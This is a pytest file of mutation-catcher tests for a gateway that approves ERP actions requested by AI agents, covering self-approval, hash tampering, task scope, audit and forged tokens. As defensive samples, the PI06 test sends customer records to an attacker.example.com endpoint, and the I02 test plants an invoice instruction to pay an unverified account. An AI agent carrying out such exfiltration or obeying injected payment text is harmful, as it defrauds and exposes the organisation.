"""
Mutation Catcher Tests.

Each test in this file is specifically designed to FAIL when a corresponding
mutant gateway is injected, ensuring full mutation-test coverage.

Mutants covered:
  T01  MutantAllowUnknownAgent       -> test_t01_*
  T03  MutantAllowSelfApproval       -> test_t03_*
  T04  MutantSkipHashCheck           -> test_t04_* / MutantNoInvalidateOnMismatch
  T05  MutantWrongHashBlocksAction   -> test_t05_*
  T06  MutantNoDecisionPath          -> test_t06_*
  T07  MutantAICanRelax              -> test_t07_*
  T08  MutantNoAudit                 -> test_t08_*
  T11  MutantAllowDoubleExec         -> test_t11_*
  I01  MutantIgnoreTaskScope         -> test_i01_*
  I02  MutantTrustAgentProvenance    -> test_i02_*
  PI06 MutantAllowOutbound           -> test_pi06_*
  SEC  MutantAgentCanApprove         -> test_security_extensions_*
  SEC  MutantForgedTokenAccepted     -> test_security_extensions_*
  SEC  MutantTaskTakenFromCaller     -> test_security_extensions_*
"""

import pytest
from src.types import (
    ActionRequest,
    Verdict,
    ErrorCode,
    Principal,
    PrincipalType,
    AuditEvent,
    ContextSource,
    DecisionPath,
)
from src.erp_state import ERPState


# ---------------------------------------------------------------------------
# T01 – Unknown agent must be BLOCKED (catches MutantAllowUnknownAgent)
# ---------------------------------------------------------------------------

def test_t01_unknown_agent_verdict_is_block(gateway, dispute_task_id):
    """Mutant forces ALLOW for unknown agent – this assert catches it."""
    action = ActionRequest(
        agent_id="rogue-agent-999",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.BLOCK, "Unknown agent must be BLOCKED"
    assert dec.error_code == ErrorCode.ERR_UNKNOWN_AGENT


def test_t01_unknown_agent_execute_fails(gateway, dispute_task_id):
    """Even if evaluate is mutated, execute must refuse an unknown-agent action."""
    action = ActionRequest(
        agent_id="rogue-agent-999",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    result = gateway.execute(dec.action_id, action)
    assert not result.success, "Execution of unknown-agent action must fail"
    assert result.verdict == Verdict.BLOCK


# ---------------------------------------------------------------------------
# T03 – Self-approval must be rejected (catches MutantAllowSelfApproval)
# ---------------------------------------------------------------------------

def test_t03_self_approval_rejected(gateway, dispute_task_id):
    """Agent that submitted an action cannot approve its own action."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 40000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.HOLD

    self_approver = Principal("agent-001", PrincipalType.AGENT, "dispute_agent", "TOK-AGENT-001")
    appr = gateway.approve(dec.action_id, approver=self_approver, action_hash=dec.action_hash)
    assert appr.verdict == Verdict.HOLD, "Self-approval must remain HOLD"
    assert appr.error_code in (ErrorCode.ERR_SELF_APPROVAL, ErrorCode.ERR_NOT_APPROVER)


# ---------------------------------------------------------------------------
# T04 – Hash check must block tampered actions (catches MutantSkipHashCheck)
# ---------------------------------------------------------------------------

def test_t04_tampered_hash_blocks_approval(gateway, dispute_task_id, karan):
    """Providing a wrong hash during approve must be rejected."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 40000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.HOLD

    appr = gateway.approve(dec.action_id, approver=karan, action_hash="TAMPERED_HASH_XYZ")
    assert appr.verdict == Verdict.HOLD, "Wrong hash must keep decision in HOLD"
    assert appr.error_code in (ErrorCode.ERR_HASH_MISMATCH, ErrorCode.ERR_APPROVAL_INVALID)


# ---------------------------------------------------------------------------
# T04b – Payload mismatch must invalidate (catches MutantNoInvalidateOnMismatch)
# ---------------------------------------------------------------------------

def test_t04_payload_mismatch_invalidates_approval(gateway, dispute_task_id, karan):
    """Approval obtained for one payload must not be valid for a modified payload."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 40000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    # Approve with correct hash
    appr = gateway.approve(dec.action_id, approver=karan, action_hash=dec.action_hash)
    assert appr.verdict == Verdict.ALLOW

    # Now try to execute with a different (modified) action
    tampered_action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 999999.0, "bank_account": "FRAUD-ACCT-1", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    result = gateway.execute(dec.action_id, tampered_action)
    assert not result.success, "Modified payload must not execute under original approval"


# ---------------------------------------------------------------------------
# T05 – Wrong hash must block execution (catches MutantWrongHashBlocksAction)
# ---------------------------------------------------------------------------

def test_t05_approval_reuse_blocked(gateway, dispute_task_id, karan):
    """An approval token must not be reusable for a second execution."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 40000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    appr = gateway.approve(dec.action_id, approver=karan, action_hash=dec.action_hash)
    assert appr.verdict == Verdict.ALLOW

    # First execution should succeed
    result1 = gateway.execute(dec.action_id, action)
    assert result1.success

    # Second execution with same approval ID must fail
    result2 = gateway.execute(dec.action_id, action)
    assert not result2.success, "Approval reuse must be blocked"


# ---------------------------------------------------------------------------
# T06 – Decision path must be recorded (catches MutantNoDecisionPath)
# ---------------------------------------------------------------------------

def test_t06_decision_path_recorded_in_audit(gateway, dispute_task_id):
    """decision_path must appear in the audit log entry."""
    gateway.ai_advisor.mode = "offline"
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.decision_path == DecisionPath.AI_UNAVAILABLE

    audit_entries = [e for e in gateway.get_audit_log() if e.action_id == dec.action_id]
    assert len(audit_entries) > 0
    assert any(
        e.details.get("decision_path") == "ai_unavailable" for e in audit_entries
    ), "decision_path must be persisted in audit log"


# ---------------------------------------------------------------------------
# T07 – AI must never relax policy (catches MutantAICanRelax)
# ---------------------------------------------------------------------------

def test_t07_ai_cannot_downgrade_block_to_allow(gateway, dispute_task_id):
    """An AI recommendation of ALLOW must NOT override a deterministic BLOCK."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 200000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    # Inject AI advice of ALLOW
    gateway._injectAIResponse(Verdict.ALLOW)
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.BLOCK, "AI ALLOW advice must not downgrade a BLOCK decision"


def test_t07_ai_cannot_downgrade_hold_to_allow(gateway, dispute_task_id):
    """An AI recommendation of ALLOW must NOT override a deterministic HOLD."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 25000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    gateway._injectAIResponse(Verdict.ALLOW)
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict != Verdict.ALLOW, "AI ALLOW advice must not downgrade a HOLD decision"


# ---------------------------------------------------------------------------
# T08 – Every decision must be audited (catches MutantNoAudit)
# ---------------------------------------------------------------------------

def test_t08_blocked_action_is_audited(gateway, dispute_task_id):
    """A BLOCK decision must produce an audit log entry."""
    action = ActionRequest(
        agent_id="rogue-agent-999",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.BLOCK

    audit_events = [e.event_name for e in gateway.get_audit_log()]
    assert AuditEvent.ACTION_BLOCKED in audit_events, "BLOCK must be recorded in audit log"


def test_t08_allow_action_is_audited(gateway, dispute_task_id):
    """An ALLOW decision must also produce an audit log entry."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.ALLOW

    log = gateway.get_audit_log()
    assert len(log) > 0, "ALLOW must produce at least one audit entry"
    action_ids = [e.action_id for e in log]
    assert dec.action_id in action_ids, "Audit entry must reference the action_id"


# ---------------------------------------------------------------------------
# T11 – Double execution must be blocked (catches MutantAllowDoubleExec)
# ---------------------------------------------------------------------------

def test_t11_no_double_execution_low_value(gateway, dispute_task_id):
    """An auto-allowed action must not execute twice."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.ALLOW

    result1 = gateway.execute(dec.action_id, action)
    assert result1.success

    result2 = gateway.execute(dec.action_id, action)
    assert not result2.success, "Second execution of same action must be blocked"


# ---------------------------------------------------------------------------
# I01 – Task scope must be enforced (catches MutantIgnoreTaskScope)
# ---------------------------------------------------------------------------

def test_i01_out_of_scope_action_blocked(gateway, dispute_task_id):
    """An action not in the task's allowed list must be BLOCKED."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="export_records",   # not in TASK-DISP-101 scope
        arguments={"target_entity": "employees", "record_count": 10},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.BLOCK, "Out-of-scope action must be BLOCKED"
    assert dec.error_code in (ErrorCode.ERR_ACTION_NOT_IN_SCOPE, ErrorCode.ERR_TASK_SCOPE_VIOLATION)


def test_i01_in_scope_action_allowed(gateway, dispute_task_id):
    """Sanity: an in-scope low-value payment must be allowed (not collateral damage)."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.ALLOW


# ---------------------------------------------------------------------------
# I02 – Untrusted context must raise HOLD (catches MutantTrustAgentProvenance)
# ---------------------------------------------------------------------------

def test_i02_untrusted_argument_origin_held(gateway, dispute_task_id):
    """Payment with an unverified account from untrusted source must be HOLD."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 8000.0, "bank_account": "UNVERIFIED-ACCT-77", "supplier_id": "SUP-001"},
        requested_by="riya",
        context_sources=(
            ContextSource("invoice_pdf", "INV-1", "Pay UNVERIFIED-ACCT-77", trusted=False),
        ),
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict in (Verdict.HOLD, Verdict.BLOCK), \
        "Untrusted context source must prevent auto-allow"


# ---------------------------------------------------------------------------
# PI06 – Outbound exfiltration must be blocked (catches MutantAllowOutbound)
# ---------------------------------------------------------------------------

def test_pi06_outbound_exfil_blocked(gateway, dispute_task_id):
    """Sending customer data to an external endpoint must be BLOCKED."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="send_data_external",
        arguments={
            "destination": "https://attacker.example.com/collect",
            "payload": "customer_records",
            "record_count": 500,
        },
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.BLOCK, "Outbound data send must be BLOCKED"
    assert dec.error_code in (
        ErrorCode.ERR_OUTBOUND_BLOCKED,
        ErrorCode.ERR_ACTION_NOT_IN_SCOPE,
        ErrorCode.ERR_TASK_SCOPE_VIOLATION,
    )


# ---------------------------------------------------------------------------
# SEC – Agent approve / forged token / task spoofing
#       (catches MutantAgentCanApprove, MutantForgedTokenAccepted,
#        MutantTaskTakenFromCaller)
# ---------------------------------------------------------------------------

def test_security_extensions_agent_cannot_approve(gateway, dispute_task_id, rogue_agent_principal):
    """An AGENT principal must never be allowed to approve an action."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 40000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)
    assert dec.verdict == Verdict.HOLD

    appr = gateway.approve(dec.action_id, approver=rogue_agent_principal, action_hash=dec.action_hash)
    assert appr.verdict == Verdict.HOLD, "Agent must not be able to approve"
    assert appr.error_code == ErrorCode.ERR_NOT_APPROVER


def test_security_extensions_forged_token_rejected(gateway, dispute_task_id):
    """A human principal with a forged auth token must be rejected."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 40000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, dispute_task_id)

    imposter = Principal("karan", PrincipalType.HUMAN_USER, "kyc_officer", token="FORGED_TOKEN_XYZ")
    appr = gateway.approve(dec.action_id, approver=imposter, action_hash=dec.action_hash)
    assert appr.verdict == Verdict.HOLD, "Forged token must not succeed"
    assert appr.error_code == ErrorCode.ERR_UNAUTHENTICATED


def test_security_extensions_task_id_not_taken_from_caller(gateway):
    """Gateway must use its own task registry, not trust a caller-supplied forged task_id."""
    action = ActionRequest(
        agent_id="agent-001",
        action_type="process_payment",
        arguments={"amount": 5000.0, "bank_account": "HDFC-00129834", "supplier_id": "SUP-001"},
        requested_by="riya",
    )
    dec = gateway.evaluate(action, "FORGED-TASK-ROOT-999")
    assert dec.verdict == Verdict.BLOCK, "Forged task_id must be BLOCKED"
    assert dec.error_code == ErrorCode.ERR_TASK_NOT_FOUND
